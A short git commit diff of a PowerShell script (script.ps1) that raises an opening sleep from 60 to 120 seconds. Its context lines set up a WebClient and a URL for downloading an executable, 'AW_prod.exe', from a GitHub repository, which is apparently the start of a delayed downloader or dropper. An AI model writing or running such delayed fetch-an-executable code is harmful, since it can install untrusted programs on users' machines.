43b3dfcda47006db56aebeb256750282777c9fd9
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2022-02-16 20:18:02 +0800

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,4 @@
-Start-Sleep -s 60
+Start-Sleep -s 120
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
 $url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
